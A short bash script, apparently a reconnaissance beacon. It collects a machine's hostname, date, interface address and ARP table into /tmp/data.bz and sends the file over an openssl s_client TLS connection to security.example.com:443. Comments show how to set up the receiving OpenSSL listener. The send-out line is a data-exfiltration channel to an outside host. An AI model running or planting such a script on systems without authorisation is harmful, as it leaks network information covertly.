#!/bin/bash
# On Server:
# openssl req -x509 -nodes -days 365 -newkey rsa:1024 -keyout mycert.pem -out mycert.pem
# sudo openssl s_server -accept 443 -cert mycert.pem -quiet


rm /tmp/data.bz
echo "===============$(hostname)================" > /tmp/data.bz
date >> /tmp/data.bz
ifconfig wlp1s0| grep 'inet addr:' >> /tmp/data.bz
arp -na >> /tmp/data.bz

echo "===============End File================" >> /tmp/data.bz
echo "" >> /tmp/data.bz

cat /tmp/data.bz | openssl s_client -connect security.example.com:443
